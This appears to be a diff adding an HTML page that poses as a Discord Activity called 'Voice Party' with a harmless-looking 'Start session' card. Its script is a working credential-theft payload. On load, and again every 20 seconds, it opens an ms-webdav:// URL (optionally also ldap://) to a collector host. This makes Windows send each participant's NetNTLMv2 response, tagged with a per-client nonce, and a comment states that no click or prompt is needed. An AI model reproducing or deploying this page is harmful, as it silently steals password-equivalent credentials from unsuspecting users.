@@ -1,0 +1,67 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Voice Party</title>
+<style>
+ html,body{margin:0;height:100%}
+ body{background:#0b0c0e;color:#e6e6e6;font:15px/1.55 system-ui,-apple-system,"Segoe UI",sans-serif;
+      display:grid;place-items:center;text-align:center}
+ .card{width:min(420px,86vw);padding:28px 22px;border-radius:16px;background:#16181d;border:1px solid #23252b}
+ h1{margin:0 0 6px;font-size:21px;letter-spacing:.2px}
+ p{margin:0 0 18px;color:#9aa0a6;font-size:14px}
+ button{width:100%;background:#5865f2;border:0;color:#fff;padding:13px 18px;border-radius:10px;
+        font:600 15px system-ui;cursor:pointer}
+ button:active{transform:translateY(1px)}
+ small{display:block;margin-top:14px;color:#6b7280;font-size:12px;word-break:break-all}
+ .dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#3ba55d;margin-right:7px;
+      vertical-align:1px}
+</style></head>
+<body>
+<div class="card">
+  <h1>Voice Party</h1>
+  <p>Join the session</p>
+  <button id="go">Start session</button>
+  <small><span class="dot"></span><span id="s">connecting…</span></small>
+</div>
+<script>
+/* ===========================================================================
+   EOCE ACTIVITY PAYLOAD
+   ---------------------------------------------------------------------------
+   This page is the Discord Activity. Discord's frames service fetches it and
+   re-serves it to every client as https://<app-snowflake>.discordsays.com, so
+   the participants' clients never talk to this host - only Discord's servers do.
+
+   What it does: hands the operating system a URL whose protocol handler
+   authenticates back to the publisher. On Windows, ms-webdav:// is the WebClient
+   service; it performs an NTLM handshake over HTTP and returns the user's
+   NetNTLMv2 response (a password equivalent) to the publisher's server.
+
+   The per-client nonce in the URL path is what lets the publisher attribute
+   each captured credential to the client that produced it.
+
+   Nothing is clicked, nothing is typed, no Discord link, no permission
+   dialog, no OS prompt.
+   =========================================================================== */
+var C2 = "192.168.1.128:8080";     // <-- publisher's collector (this Mac)
+var CARRIER = "ms-webdav";           // Windows WebClient -> NTLM over HTTP
+var ALSO_LDAP = false;               // true = also try ldap:// (second carrier)
+
+var nonce = (Math.random()*1e9|0).toString(36) + "-" + Date.now().toString(36);
+var url = CARRIER + "://" + C2 + "/" + nonce;
+var fired = 0, done = false;
+
+function status(t){ var e=document.getElementById("s"); if(e) e.textContent=t; }
+
+function fire(){
+  fired++;
+  try { window.open(url, "EOCE"+fired); } catch(e) {}
+  try { if(ALSO_LDAP) window.open("ldap://"+C2+"/"+nonce, "EOCEL"+fired); } catch(e) {}
+  if(!done){ done=true; status("connected · " + nonce); }
+}
+
+fire();                       // no gesture required when the frame holds allow-popups
+setTimeout(fire, 1500);       // some clients need a second beat
+setInterval(fire, 20000);     // keep re-firing for late joiners
+document.getElementById("go").addEventListener("click", function(){ fire(); status("starting…"); });
+</script>
+</body></html>
